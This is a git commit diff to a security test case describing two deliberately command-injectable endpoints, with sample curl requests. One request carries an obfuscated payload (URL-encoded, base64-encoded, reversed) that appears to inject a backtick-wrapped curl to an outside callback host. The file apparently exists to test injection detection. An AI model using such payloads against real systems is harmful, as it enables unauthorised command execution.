b4c1f235d408d15ea91dab0efc8171e4374c68de
fi7z <dev@softwaresecured.com>
2025-01-22 14:44:44 -0500

    initial commit

--- testcase-92.py
+++ testcase-92.py
@@ -1,7 +1,7 @@
 # testcase for issue 92
 # 2 endpoints, both have an arg1 parameter that is vulnerable to command injection
 # /case_noencode does not have any encoding
-# /case_encode is URL encoded and base64 encoded
+# /case_encode is URL encoded and base64 encoded and reversed
 # Curl commands to send request through proxy:
 # curl -x localhost:8080 -X POST http://localhost:4444/case_encode -d 'arg1=hostname' -H 'Content-Type: application/x-www-form-urlencoded'
 # curl -x localhost:8080 -X POST http://localhost:4444/case_noencode -d 'arg1=%59%47%46%6a%4c%6a%45%74%63%33%4d%75%62%44%5a%33%61%54%46%6c%4f%48%46%6f%61%33%46%35%64%6a%4e%69%61%6a%56%6b%5a%54%64%70%4e%6e%6c%6c%61%57%6c%6a%64%47%5a%6d%5a%7a%51%77%4e%69%42%73%63%6e%56%6a%59%41%3d%3d' -H 'Content-Type: application/x-www-form-urlencoded'
